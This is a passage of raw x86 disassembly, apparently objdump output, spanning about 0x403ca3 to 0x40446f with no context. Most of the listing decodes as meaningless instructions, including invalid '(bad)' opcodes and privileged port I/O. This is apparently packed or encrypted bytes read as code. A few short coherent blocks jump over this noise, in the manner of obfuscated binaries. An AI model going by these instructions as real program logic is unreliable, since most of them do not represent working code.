  403ca3:	xchg   esi,eax
  403ca4:	int3   
  403ca5:	outs   dx,BYTE PTR ds:[esi]
  403ca6:	mov    ecx,0x22498e04
  403cab:	mov    eax,ds:0x9fccf97e
  403cb0:	sub    DWORD PTR [ebx+0x7d11bf87],edx
  403cb6:	inc    ebp
  403cb7:	mov    BYTE PTR [edx],0x79
  403cba:	leave  
  403cbb:	cmp    al,0x83
  403cbd:	cdq    
  403cbe:	xchg   ebp,eax
  403cbf:	jo     0x403c5a
  403cc1:	stc    
  403cc2:	jbe    0x403cf0
  403cc4:	ins    BYTE PTR es:[edi],dx
  403cc5:	pop    ds
  403cc6:	and    eax,DWORD PTR [edi]
  403cc8:	std    
  403cc9:	jge    0x403c96
  403ccb:	sbb    BYTE PTR [esi-0x1e],dh
  403cce:	add    DWORD PTR [ecx],eax
  403cd0:	out    dx,eax
  403cd1:	or     al,0x1
  403cd3:	scas   al,BYTE PTR es:[edi]
  403cd4:	addr16 add al,0x9e
  403cd7:	mov    BYTE PTR [edx-0x654ffa0f],0xf3
  403cde:	leave  
  403cdf:	mov    BYTE PTR [edx+0x1111667b],dh
  403ce5:	aas    
  403ce6:	dec    ebp
  403ce7:	shl    DWORD PTR [edx+ebx*4+0x7c2844cc],0x19
  403cef:	popa   
  403cf0:	cmc    
  403cf1:	mov    edx,0x2fc3bff
  403cf6:	pop    ebp
  403cf7:	sbb    al,0x60
  403cf9:	dec    esi
  403cfa:	mov    ah,0x1a
  403cfc:	adc    eax,0x49e29281
  403d01:	into   
  403d02:	(bad)  [esi-0x295ad20]
  403d08:	popf   
  403d09:	sub    dh,BYTE PTR ds:0x33c5eaa6
  403d0f:	or     al,0x5c
  403d11:	pop    esi
  403d12:	aam    0x20
  403d14:	pop    es
  403d15:	inc    eax
  403d16:	inc    ebp
  403d17:	(bad)  
  403d18:	dec    esi
  403d19:	in     eax,0xfd
  403d1b:	lds    esp,FWORD PTR [ecx+0x7e6d635d]
  403d21:	fstp   DWORD PTR [esi+0x76]
  403d24:	ja     0x403d9a
  403d26:	jns    0x403cb8
  403d28:	aaa    
  403d29:	pop    ds
  403d2a:	jo     0x403d0d
  403d2c:	cmp    ebp,DWORD PTR [ecx-0x31]
  403d2f:	sar    BYTE PTR cs:[edx+0x7e],0x75
  403d34:	ins    DWORD PTR es:[edi],dx
  403d35:	adc    al,BYTE PTR [ecx]
  403d37:	adc    DWORD PTR [esi-0x37205c8f],edx
  403d3d:	pop    eax
  403d3e:	clc    
  403d3f:	sbb    al,0x45
  403d41:	cli    
  403d42:	sub    BYTE PTR [ecx],bl
  403d44:	pop    ecx
  403d45:	std    
  403d46:	outs   dx,DWORD PTR ds:[esi]
  403d47:	je     0x403d63
  403d49:	(bad)  
  403d4a:	jl     0x403cef
  403d4c:	jle    0x403d59
  403d4e:	cmp    esi,DWORD PTR [esi]
  403d50:	jle    0x403dbb
  403d52:	adc    eax,DWORD PTR ss:[ecx+0x32bb339f]
  403d59:	loopne 0x403d38
  403d5b:	mov    ch,0xc2
  403d5d:	push   ebx
  403d5e:	xor    eax,0xcb1b2a08
  403d63:	lock sub cl,bh
  403d66:	inc    ebp
  403d67:	dec    esi
  403d68:	dec    ebx
  403d69:	sbb    BYTE PTR [edi-0x44fd03ce],dl
  403d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d70:	adc    eax,0xc164f55b
  403d75:	mov    dl,0x55
  403d77:	je     0x403dc6
  403d79:	scas   eax,DWORD PTR es:[edi]
  403d7a:	outs   dx,BYTE PTR ds:[esi]
  403d7b:	sbb    DWORD PTR [eax],edi
  403d7d:	xchg   ebx,eax
  403d7e:	adc    al,0xc8
  403d80:	mov    dl,0x87
  403d82:	addr16 (bad) 
  403d84:	pop    esp
  403d85:	nop
  403d86:	clc    
  403d87:	sub    edi,DWORD PTR [ecx-0x184dfe9a]
  403d8d:	mov    cl,0x90
  403d8f:	cmp    DWORD PTR [edi-0x56],esi
  403d92:	sub    eax,eax
  403d94:	push   ebx
  403d95:	adc    al,BYTE PTR [edi-0x1c]
  403d98:	mov    ah,0x22
  403d9a:	mov    ecx,0x4b83a3ca
  403d9f:	cld    
  403da0:	dec    esi
  403da1:	loop   0x403d2d
  403da3:	xchg   ebp,eax
  403da4:	pop    ds
  403da5:	mov    cl,0xf0
  403da7:	and    DWORD PTR [esi-0x40],esi
  403daa:	sub    al,0xcf
  403dac:	fdiv   DWORD PTR [edx+0x2d]
  403daf:	fsubr  DWORD PTR [ebp-0x51]
  403db2:	xor    DWORD PTR [ecx+edx*2+0x4e521eb1],ecx
  403db9:	adc    DWORD PTR [eax+0x6e502c1c],ebx
  403dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dc0:	call   0xb92d:0x33bee905
  403dc7:	xlat   BYTE PTR ds:[ebx]
  403dc8:	inc    ebx
  403dc9:	mov    ch,0x66
  403dcb:	imul   ecx,esi,0x94a5fba6
  403dd1:	push   edx
  403dd2:	out    dx,al
  403dd3:	and    eax,esi
  403dd5:	mov    al,0xd
  403dd7:	pop    edx
  403dd8:	inc    ebx
  403dd9:	pop    esi
  403dda:	data16 hlt 
  403ddc:	test   BYTE PTR [ecx-0x3f95c7ad],al
  403de2:	mov    esp,0x39b2ff83
  403de7:	cmp    esi,eax
  403de9:	xchg   BYTE PTR [esi-0x657f1116],ah
  403def:	stos   DWORD PTR es:[edi],eax
  403df0:	adc    dh,bh
  403df2:	popa   
  403df3:	lahf   
  403df4:	jl     0x403db5
  403df6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403df7:	ss (bad) 
  403df9:	rcr    ecx,1
  403dfb:	test   ebp,edx
  403dfd:	inc    esp
  403dfe:	push   0x6d
  403e00:	in     al,0xfe
  403e02:	(bad)  
  403e03:	stc    
  403e04:	xor    BYTE PTR [eax-0x4ca1afc9],0x4
  403e0b:	in     al,0x35
  403e0d:	xor    DWORD PTR [ebx-0xf],ecx
  403e10:	and    ebp,DWORD PTR [edi]
  403e12:	jns    0x403df2
  403e14:	fld    st(1)
  403e16:	push   edx
  403e17:	xchg   ecx,eax
  403e18:	mov    ebx,0xd10e09dc
  403e1d:	mov    ah,0x8d
  403e1f:	inc    edx
  403e20:	inc    edi
  403e21:	std    
  403e22:	(bad)  
  403e23:	in     al,0x3
  403e25:	cmp    DWORD PTR [edi],edx
  403e27:	sbb    al,0xfc
  403e29:	xchg   ecx,eax
  403e2a:	fild   QWORD PTR [ebx+0x4fb5aceb]
  403e30:	mov    dh,dl
  403e32:	mov    ebp,0x6389a750
  403e37:	into   
  403e38:	dec    edi
  403e39:	mov    ds:0xc11d3ef1,eax
  403e3e:	push   ecx
  403e3f:	push   cs
  403e40:	ins    BYTE PTR es:[edi],dx
  403e41:	mov    cl,0x14
  403e43:	aad    0x33
  403e45:	psubusb mm7,QWORD PTR ds:0x1d8721ef
  403e4c:	xor    eax,0xb56a9b76
  403e51:	and    bl,dl
  403e53:	inc    esp
  403e54:	jle    0x403ed2
  403e56:	(bad)  
  403e57:	xlat   BYTE PTR ds:[ebx]
  403e58:	adc    ecx,DWORD PTR [esi+0x178d9ef6]
  403e5e:	out    dx,al
  403e5f:	mov    WORD PTR [ebp-0x2bfba93f],gs
  403e65:	sar    DWORD PTR [ebx-0x4debe308],0x45
  403e6c:	jae    0x403e1c
  403e6e:	fisttp DWORD PTR [edx-0x53bce18a]
  403e74:	sub    bl,dh
  403e76:	das    
  403e77:	mov    bl,0x43
  403e79:	sahf   
  403e7a:	adc    eax,0x44c46ec9
  403e7f:	jns    0x403eed
  403e81:	pushf  
  403e82:	scas   eax,DWORD PTR es:[edi]
  403e83:	test   BYTE PTR [eax],al
  403e85:	xor    eax,0xa93eadab
  403e8a:	lock xor eax,0x117d677e
  403e90:	addr16 pop ecx
  403e92:	adc    ebx,ebp
  403e94:	mov    al,cl
  403e96:	pusha  
  403e97:	iret   
  403e98:	push   ebp
  403e99:	mov    ebp,0x60f5e941
  403e9e:	(bad)  
  403e9f:	mov    edi,0xb781c4f8
  403ea4:	inc    edx
  403ea5:	pop    esp
  403ea6:	adc    eax,0x68a6d763
  403eab:	adc    al,0xc8
  403ead:	jnp    0x403ec1
  403eaf:	adc    edi,esi
  403eb1:	imul   edi,DWORD PTR [edx],0xffffffdc
  403eb4:	into   
  403eb5:	iret   
  403eb6:	mov    edx,DWORD PTR [esi]
  403eb8:	push   ecx
  403eb9:	jmp    0xa705:0x1e6d7493
  403ec0:	and    al,0x7d
  403ec2:	and    BYTE PTR [edx],0x1d
  403ec5:	push   cs
  403ec6:	lods   al,BYTE PTR ds:[esi]
  403ec7:	(bad)  
  403ec8:	repnz dec esp
  403eca:	es mov edx,0x3be3eec8
  403ed0:	push   edx
  403ed1:	adc    BYTE PTR [esi+0x60aa9a87],dh
  403ed7:	sub    bh,dh
  403ed9:	enter  0xe4c9,0xab
  403edd:	adc    al,0x41
  403edf:	into   
  403ee0:	dec    BYTE PTR [ecx-0x47e0258b]
  403ee6:	sbb    esp,DWORD PTR [edx+0x65]
  403ee9:	xchg   esp,eax
  403eea:	dec    esi
  403eeb:	cmp    esp,DWORD PTR [ecx]
  403eed:	sub    eax,esp
  403eef:	adc    DWORD PTR [esi+0x61],esi
  403ef2:	ja     0x403f18
  403ef4:	fcmovne st,st(3)
  403ef6:	fdivr  st(0),st
  403ef8:	mov    ebp,0x8232d9c2
  403efd:	pop    esi
  403efe:	and    al,BYTE PTR [edi+ebp*2+0x3a]
  403f02:	cwde   
  403f03:	dec    ebx
  403f04:	add    BYTE PTR [bp+di],0xb8
  403f08:	cli    
  403f09:	mov    dh,0xa5
  403f0b:	add    eax,DWORD PTR [ecx]
  403f0d:	sbb    DWORD PTR ds:0x42819f,ebx
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x42821f
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x4283ab,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x428267,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx+0x675d9dbc],ch
  403f58:	mov    esp,0x1818d7ce
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    BYTE PTR [ecx+0x4c],dh
  403f63:	push   ebx
  403f64:	fistp  QWORD PTR [ebx+edi*4+0x6a]
  403f68:	push   ds
  403f69:	fwait
  403f6a:	repnz cmp al,BYTE PTR [ecx-0x22c9408a]
  403f71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f72:	push   edi
  403f73:	push   cs
  403f74:	or     eax,0x498a20bc
  403f7a:	add    DWORD PTR [ebp-0x57a15e53],0xffffff81
  403f81:	inc    ecx
  403f82:	iret   
  403f83:	in     al,dx
  403f84:	hlt    
  403f85:	pop    ebp
  403f86:	xor    al,0xe7
  403f88:	push   esi
  403f89:	sbb    eax,0x24fef490
  403f8e:	sub    BYTE PTR ds:0x306026c4,dh
  403f94:	out    0x29,al
  403f96:	out    dx,al
  403f97:	mov    ecx,0x4bf21c1c
  403f9c:	sti    
  403f9d:	test   DWORD PTR [eax-0x42],edi
  403fa0:	fwait
  403fa1:	adc    BYTE PTR [esi-0x684977f8],dh
  403fa7:	or     BYTE PTR [edx],bh
  403fa9:	push   esi
  403faa:	lds    edx,FWORD PTR [ebx]
  403fac:	mov    ds:0x4de46fe5,al
  403fb1:	dec    esi
  403fb2:	aaa    
  403fb3:	xor    esi,0xb3376efe
  403fb9:	mov    bl,BYTE PTR [ebx-0x74344881]
  403fbf:	jb     0x403fd2
  403fc1:	int3   
  403fc2:	test   BYTE PTR [edx+ebp*8-0x70],ah
  403fc6:	(bad)  
  403fc8:	and    BYTE PTR cs:[edi+0x549b918b],ah
  403fcf:	dec    edx
  403fd0:	pop    ds
  403fd1:	bound  ebp,QWORD PTR [edx-0x58f2d68d]
  403fd7:	inc    esp
  403fd8:	cmp    al,0x4f
  403fda:	lar    esp,WORD PTR [edx+0xe]
  403fde:	test   al,0x9a
  403fe0:	lods   eax,DWORD PTR ds:[esi]
  403fe1:	or     al,0xbb
  403fe3:	aas    
  403fe4:	inc    edx
  403fe5:	fsub   st(2),st
  403fe7:	es or  dh,dh
  403fea:	adc    ah,al
  403fec:	adc    esi,DWORD PTR [ecx+0x2d96959d]
  403ff2:	jno    0x403fef
  403ff4:	(bad)  
  403ff5:	call   DWORD PTR [ebx-0x42]
  403ff8:	inc    ebp
  403ff9:	and    al,0x18
  403ffb:	xor    ebx,ebp
  403ffd:	or     ebx,DWORD PTR [esi+0x40]
  404000:	jns    0x40401f
  404002:	pop    ss
  404003:	xchg   esi,eax
  404004:	jne    0x403f97
  404006:	or     BYTE PTR [esi+ecx*2],ch
  404009:	fmul   QWORD PTR [ecx+esi*1+0x71]
  40400d:	ds mov bh,0x83
  404010:	or     DWORD PTR [ebx+eiz*1-0x22],edi
  404014:	xchg   DWORD PTR [edx+0x7fde1967],eax
  40401a:	inc    esp
  40401b:	sbb    ebp,DWORD PTR [ebx]
  40401d:	ins    DWORD PTR es:[edi],dx
  40401e:	out    0x7d,al
  404020:	sbb    dl,ch
  404022:	push   eax
  404023:	xchg   ecx,eax
  404024:	data16 out dx,al
  404026:	in     al,dx
  404027:	(bad)  
  404029:	enter  0xf987,0x18
  40402d:	call   0x497ca2b1
  404032:	sub    al,0x6d
  404034:	jbe    0x403fdd
  404036:	and    al,0x2
  404038:	xchg   ebx,eax
  404039:	les    esi,FWORD PTR [edi-0x6f]
  40403c:	pushf  
  40403d:	xchg   DWORD PTR [ebx-0x6a],esi
  404040:	mov    eax,0xc6274d99
  404045:	ins    DWORD PTR es:[edi],dx
  404046:	ror    BYTE PTR [eax],cl
  404048:	push   ss
  404049:	adc    dl,cl
  40404b:	xchg   ebx,eax
  40404c:	mov    dl,0xa
  40404e:	mov    cl,0x59
  404050:	shr    DWORD PTR [eax],0x1e
  404053:	xor    al,0x19
  404055:	jbe    0x40408f
  404057:	and    edi,eax
  404059:	outs   dx,DWORD PTR ds:[esi]
  40405a:	add    al,0xf8
  40405c:	dec    edi
  40405d:	xchg   edi,eax
  40405e:	adc    al,0x4a
  404060:	mov    ch,0x5
  404062:	xor    eax,0x5466c496
  404067:	mov    esp,0xc68fb68f
  40406c:	into   
  40406d:	add    al,0xec
  40406f:	jmp    0x4040d9
  404071:	out    dx,eax
  404072:	fnsave [bx+si]
  404075:	add    DWORD PTR [edx-0x3c],ebx
  404078:	loope  0x4040b3
  40407a:	pusha  
  40407b:	ror    DWORD PTR [ecx+0x35],cl
  40407e:	and    al,ah
  404080:	(bad)  
  404081:	mov    ecx,0x736110bd
  404086:	xlat   BYTE PTR ds:[ebx]
  404087:	pop    ebp
  404088:	pop    esp
  404089:	push   edi
  40408a:	scas   al,BYTE PTR es:[edi]
  40408b:	jp     0x40402e
  40408d:	std    
  40408e:	jo     0x4040eb
  404090:	in     eax,0xe1
  404092:	outs   dx,BYTE PTR ds:[esi]
  404093:	popf   
  404094:	pop    edi
  404095:	dec    esi
  404096:	fs out 0xff,eax
  404099:	hlt    
  40409a:	xor    DWORD PTR [ecx],esi
  40409c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40409d:	pop    esi
  40409e:	repz cwde 
  4040a0:	cs mov esi,esp
  4040a3:	mov    eax,ds:0x7fd48acd
  4040a8:	pop    ebp
  4040a9:	es popf 
  4040ab:	fimul  DWORD PTR [eax-0x51]
  4040ae:	and    DWORD PTR [eax-0x46d58530],eax
  4040b4:	jmp    0x404078
  4040b6:	mov    ch,0x80
  4040b8:	jne    0x4040b1
  4040ba:	or     BYTE PTR [edx],al
  4040bc:	xchg   BYTE PTR [edx+0x31],cl
  4040bf:	lods   eax,DWORD PTR ds:[esi]
  4040c0:	pop    ds
  4040c1:	mov    ?,WORD PTR [ebx+edi*4+0x6ab5f60b]
  4040c8:	adc    dh,cl
  4040ca:	stc    
  4040cb:	xchg   esi,eax
  4040cc:	in     eax,dx
  4040cd:	cmp    ebx,DWORD PTR [edi+esi*2+0x1c]
  4040d1:	cs and eax,0x9d485f12
  4040d7:	mov    ds:0xf02a367e,eax
  4040dc:	sub    al,dh
  4040de:	ret    0x6634
  4040e1:	pop    edi
  4040e2:	gs pop edi
  4040e4:	and    esp,0x76357f80
  4040ea:	jge    0x40411e
  4040ec:	loop   0x40410a
  4040ee:	mov    DWORD PTR [edi+ebp*1-0x6ad9c354],esi
  4040f5:	mov    edi,0xbcba7090
  4040fa:	mov    dh,0xe1
  4040fc:	cld    
  4040fd:	sbb    eax,0x331406d2
  404102:	imul   eax,ecx,0xa
  404105:	call   0xe06b3b2b
  40410a:	ret    
  40410b:	and    BYTE PTR [edi],dl
  40410d:	fist   WORD PTR [esp+esi*1]
  404110:	add    BYTE PTR ds:0xb911f0e3,0xbd
  404117:	lods   eax,DWORD PTR ds:[esi]
  404118:	ss sub eax,0xa11c64b9
  40411e:	aaa    
  40411f:	scas   al,BYTE PTR es:[edi]
  404120:	int    0x5a
  404122:	mov    ds:0xac8e5e59,eax
  404127:	push   esp
  404128:	cwde   
  404129:	pop    edx
  40412a:	out    dx,eax
  40412b:	pop    edx
  40412c:	and    eax,0x38420166
  404131:	jle    0x4040d4
  404133:	out    0xb5,eax
  404135:	sahf   
  404136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404137:	add    eax,0x33da5b7e
  40413c:	retf   
  40413d:	scas   eax,DWORD PTR es:[edi]
  40413e:	fiadd  DWORD PTR [eax-0x61]
  404141:	pop    ebp
  404142:	(bad)  
  404143:	(bad)  
  404144:	push   0x70606603
  404149:	fild   QWORD PTR [edx+0xf33d042]
  40414f:	dec    eax
  404150:	push   ds
  404151:	add    BYTE PTR [ecx],ch
  404153:	and    ah,BYTE PTR [ebx+0x38297e4b]
  404159:	mov    ecx,DWORD PTR [edx]
  40415b:	loope  0x404194
  40415d:	gs mov ecx,0x778fe9d4
  404163:	out    0x86,eax
  404165:	fidiv  WORD PTR [eax]
  404167:	mov    bh,0x6d
  404169:	lahf   
  40416a:	iretw  
  40416c:	lea    edi,ss:[ebp+0x3e88199f]
  404173:	xor    esi,ebp
  404175:	popa   
  404176:	nop
  404177:	xchg   edx,eax
  404178:	xchg   edi,eax
  404179:	mov    ebp,0x260feecb
  40417e:	push   ss
  40417f:	mov    edi,0x6e047727
  404184:	sbb    BYTE PTR [eax],cl
  404186:	mov    bh,0x6f
  404188:	out    0xa,eax
  40418a:	inc    eax
  40418b:	dec    edi
  40418c:	mov    dh,0xe8
  40418e:	int3   
  40418f:	ss cld 
  404191:	mov    esi,DWORD PTR [ebx+eiz*8-0x7d1bebf2]
  404198:	sub    eax,DWORD PTR [ebx]
  40419a:	or     al,BYTE PTR [edx-0x66]
  40419d:	scas   al,BYTE PTR es:[edi]
  40419e:	add    edx,esp
  4041a0:	inc    ebp
  4041a1:	test   DWORD PTR [ebx],edi
  4041a3:	dec    esp
  4041a4:	lock mov ch,BYTE PTR [eax-0x4c]
  4041a8:	inc    eax
  4041a9:	scas   al,BYTE PTR es:[edi]
  4041aa:	ins    BYTE PTR es:[edi],dx
  4041ab:	jl     0x4041b8
  4041ad:	(bad)  
  4041ae:	pop    ecx
  4041af:	enter  0x4987,0x65
  4041b3:	lods   eax,DWORD PTR ds:[esi]
  4041b4:	clc    
  4041b5:	dec    esp
  4041b6:	mov    DWORD PTR [edx-0x2d3cce1a],ebp
  4041bc:	sbb    DWORD PTR [esi+0x7a80c0c7],edi
  4041c2:	cdq    
  4041c3:	dec    edx
  4041c4:	pop    eax
  4041c5:	lea    edx,[eax+ecx*8+0x2178dcc7]
  4041cc:	sar    DWORD PTR [eax-0x346aa3a1],0x75
  4041d3:	xor    al,0x6
  4041d5:	clc    
  4041d6:	(bad)  
  4041d7:	lahf   
  4041d8:	cwde   
  4041d9:	(bad)  
  4041db:	je     0x40423d
  4041dd:	(bad)  
  4041de:	fcomp  QWORD PTR [ebx]
  4041e0:	xchg   ebx,eax
  4041e1:	jae    0x404224
  4041e3:	lahf   
  4041e4:	aaa    
  4041e5:	mov    al,ds:0x547c8c70
  4041ea:	pop    eax
  4041eb:	stos   DWORD PTR es:[edi],eax
  4041ec:	sbb    ah,cl
  4041ee:	leave  
  4041ef:	inc    edx
  4041f0:	jmp    0x4041b7
  4041f2:	push   ecx
  4041f3:	sti    
  4041f4:	scas   eax,DWORD PTR es:[edi]
  4041f5:	les    eax,FWORD PTR [eax-0x50]
  4041f8:	int3   
  4041f9:	mov    dl,0xb
  4041fb:	out    0xbf,al
  4041fd:	push   ebp
  4041fe:	(bad)  
  4041ff:	mov    ecx,0x7119a8dd
  404204:	data16 int3 
  404206:	loopne 0x40423c
  404208:	gs enter 0xb5c7,0xcb
  40420d:	fisttp WORD PTR [edi]
  40420f:	cmp    BYTE PTR [eax],al
  404211:	mov    eax,eax
  404213:	inc    edx
  404214:	ds scas eax,DWORD PTR es:[edi]
  404216:	xchg   ecx,eax
  404217:	dec    ecx
  404218:	dec    esi
  404219:	or     DWORD PTR [ecx],0x7e0d92fc
  40421f:	sub    eax,0x528f94ad
  404224:	mov    esi,0xfd5af43a
  404229:	ret    0xa728
  40422c:	inc    ebx
  40422d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40422e:	add    BYTE PTR [edx+ebx*2],ch
  404231:	nop
  404232:	cmp    BYTE PTR ds:0xa3e87002,bh
  404238:	mov    ecx,0x54913ad2
  40423d:	jle    0x4042a7
  40423f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404240:	lea    ebp,ds:0xad07c63b
  404246:	imul   esp,DWORD PTR [ecx+eiz*1-0x33],0xb9a6797b
  40424e:	and    ecx,ebp
  404250:	and    cl,BYTE PTR [eax+0x4dcc0ccb]
  404256:	xchg   esp,eax
  404257:	or     DWORD PTR [eax+0x19],eax
  40425a:	fs dec edx
  40425c:	xchg   ebx,eax
  40425d:	or     eax,DWORD PTR [eax]
  40425f:	xchg   edi,eax
  404260:	loope  0x4042b6
  404262:	std    
  404263:	xor    eax,0x1aa7db8c
  404268:	test   al,0xd1
  40426a:	shl    bh,cl
  40426c:	arpl   WORD PTR [ebx-0x317d670f],sp
  404272:	(bad)  
  404273:	pop    ebx
  404274:	mov    esp,0x7b38b041
  404279:	call   0xf2c5:0xdeba16a9
  404280:	sub    DWORD PTR [esi],0xbc07f6c
  404286:	push   ebp
  404287:	data16 cmp dl,bl
  40428a:	and    DWORD PTR [ebx-0x395a8d4],esp
  404290:	pop    ecx
  404291:	sub    bl,BYTE PTR [ebx]
  404293:	cld    
  404294:	dec    ebx
  404295:	mov    dl,0x2
  404297:	retf   0x8183
  40429a:	pop    ecx
  40429b:	push   edi
  40429c:	or     ebx,DWORD PTR [eax-0x50e87d6f]
  4042a2:	rcr    DWORD PTR gs:[edi],0x6b
  4042a6:	icebp  
  4042a7:	scas   eax,DWORD PTR es:[edi]
  4042a8:	jnp    0x404283
  4042aa:	inc    esp
  4042ab:	jl     0x404329
  4042ad:	sub    eax,DWORD PTR [edx+0x4d]
  4042b0:	pop    ss
  4042b1:	xor    dl,dl
  4042b3:	sbb    ebx,DWORD PTR [edi+0x354102ff]
  4042b9:	mov    ds:0x8db8f3d0,al
  4042be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042bf:	mov    DWORD PTR [eax+0x19],0x2fc59ed2
  4042c6:	cwde   
  4042c7:	lds    ebx,FWORD PTR ds:0xaa034d7f
  4042cd:	test   eax,0xeac3a1c1
  4042d2:	fnsave [ebx]
  4042d4:	dec    ebp
  4042d5:	ins    BYTE PTR es:[edi],dx
  4042d6:	imul   edi,DWORD PTR [edi],0x21
  4042d9:	sub    ebp,ebx
  4042db:	pop    edx
  4042dc:	icebp  
  4042dd:	sbb    eax,0xe08a487d
  4042e2:	jl     0x40433a
  4042e4:	iret   
  4042e5:	in     eax,dx
  4042e6:	add    cl,bh
  4042e8:	xchg   edi,eax
  4042e9:	imul   BYTE PTR [ebp-0x5ed8692a]
  4042ef:	push   esp
  4042f0:	or     ah,ch
  4042f2:	mov    ah,0x3f
  4042f4:	js     0x404328
  4042f6:	addr16 xchg edi,eax
  4042f8:	das    
  4042f9:	fsubr  DWORD PTR [edx+0x757ff]
  4042ff:	mov    ebp,0x5ab92e85
  404304:	mov    al,ds:0xce16714e
  404309:	jmp    0x40431e
  40430b:	stos   BYTE PTR es:[edi],al
  40430c:	inc    edx
  40430d:	inc    edx
  40430e:	jmp    0xbb9c2419
  404313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404314:	les    eax,FWORD PTR [ebx]
  404316:	adc    dh,0xfb
  404319:	mov    eax,0x279325f3
  40431e:	dec    esi
  40431f:	aad    0xc3
  404321:	int3   
  404322:	mov    edx,DWORD PTR [ebx+0x4]
  404325:	and    DWORD PTR ds:0x42826b,ebx
  40432b:	xor    ecx,edi
  40432d:	or     edx,DWORD PTR ds:0x42829b
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x428317
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x428257
  404344:	and    DWORD PTR ds:0x4283b7,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x42839f
  404355:	sbb    DWORD PTR ds:0x4282ab,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	fwait
  404370:	dec    ebx
  404371:	xchg   DWORD PTR [ebp+edx*2-0x31],edi
  404375:	sbb    BYTE PTR [eax],bl
  404377:	sahf   
  404378:	adc    bl,BYTE PTR [eax]
  40437a:	sbb    BYTE PTR [edi+0x14],dh
  40437d:	rcr    esi,cl
  40437f:	push   0xf
  404381:	cmp    BYTE PTR [ebx+eax*2],bh
  404384:	jmp    0x40438b
  404386:	xchg   ecx,eax
  404387:	inc    eax
  404388:	inc    edi
  404389:	xchg   DWORD PTR [esi-0x5c],ebp
  40438c:	popf   
  40438d:	(bad)  
  40438e:	mov    dl,0x8
  404390:	retf   
  404391:	cmp    ecx,ebp
  404393:	sbb    dh,0xb2
  404396:	sbb    esp,ebx
  404398:	xchg   edi,eax
  404399:	or     eax,0x3b07eec8
  40439e:	ins    DWORD PTR es:[edi],dx
  40439f:	push   ebx
  4043a0:	and    DWORD PTR [edx+0x2b],edx
  4043a3:	inc    edx
  4043a4:	jne    0x404380
  4043a6:	adc    dh,BYTE PTR [ebp-0xb]
  4043a9:	inc    edx
  4043aa:	std    
  4043ab:	jecxz  0x4043c0
  4043ad:	jae    0x404359
  4043af:	mov    WORD PTR [edi],ss
  4043b1:	xor    DWORD PTR [esi+0x50a7aaba],ecx
  4043b7:	rcl    BYTE PTR [edx+0x321082e3],0x66
  4043be:	lahf   
  4043bf:	in     al,dx
  4043c0:	call   0x61de96f
  4043c5:	in     al,0xc2
  4043c7:	leave  
  4043c8:	sub    ah,BYTE PTR [eax+0x1184ed47]
  4043ce:	mov    ch,BYTE PTR ds:[ebx+0x3f]
  4043d2:	cmp    al,0xaa
  4043d4:	fisubr WORD PTR [eax-0x20]
  4043d7:	mov    ds:0x6872c2c9,eax
  4043dc:	fisttp QWORD PTR [ebx+0x7e1bee9a]
  4043e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043e3:	and    eax,0xfe43c7b2
  4043e8:	stc    
  4043e9:	add    DWORD PTR [ebx-0x5ac0988a],edi
  4043ef:	mov    al,ch
  4043f1:	cmp    eax,0x887f14c
  4043f6:	(bad)  
  4043f7:	mov    ecx,DWORD PTR [ebx-0x232e6b1a]
  4043fd:	cwde   
  4043fe:	mov    esi,0x18e07c40
  404403:	jae    0x404443
  404405:	or     ecx,0xffffffb7
  404408:	or     eax,0xece6f1ae
  40440d:	jecxz  0x4043e3
  40440f:	test   ecx,ebx
  404411:	rol    BYTE PTR [ebx-0x4b],0x4e
  404415:	mov    cl,al
  404417:	inc    ebp
  404418:	mov    BYTE PTR [esi+ebx*8+0x8a12b09],dl
  40441f:	lods   eax,DWORD PTR ds:[esi]
  404420:	test   DWORD PTR [esi+0x7dec52b2],edx
  404426:	xor    dh,dh
  404428:	mov    fs,WORD PTR [ecx-0x5dac02b3]
  40442e:	jge    0x404475
  404430:	fild   DWORD PTR [esi+ecx*2-0x559e261d]
  404437:	sub    al,0x88
  404439:	cs jg  0x40443c
  40443c:	enter  0xd4e6,0x8a
  404440:	mov    ebp,0xa5ac5225
  404445:	ret    0xaf5
  404448:	jmp    DWORD PTR [edi]
  40444a:	and    esp,0x12
  40444d:	xchg   ebp,eax
  40444e:	mov    bl,0x5f
  404450:	test   ebp,ebp
  404452:	dec    ebp
  404453:	lock sbb BYTE PTR [edi+eax*8-0x43f9a66d],bl
  40445b:	cli    
  40445c:	xchg   ebx,eax
  40445d:	mov    DWORD PTR ds:0x90a0026c,esp
  404463:	pop    esi
  404464:	mov    eax,0xbef98a2f
  404469:	gs icebp 
  40446b:	cs xor al,0xa6
  40446e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40446f:	(bad)  
